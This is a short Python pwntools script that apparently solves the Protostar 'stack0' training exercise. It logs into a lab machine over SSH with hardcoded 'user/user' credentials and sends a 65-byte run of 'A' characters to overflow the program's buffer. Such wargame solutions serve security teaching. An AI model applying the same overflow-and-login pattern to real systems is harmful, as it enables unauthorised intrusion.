from pwn import *

IP   = '192.168.8.110'
USER = 'user'
PASS = 'user'
PORT = 22

shell = ssh(user=USER, host=IP, password=USER, port=PORT)
sh = shell.run('/bin/sh')
sh.sendline('/opt/protostar/bin/stack0')
log.info('sending payload..')
payload = "A"*65
sh.sendline(payload)
log.success(sh.recvline())
shell.close()

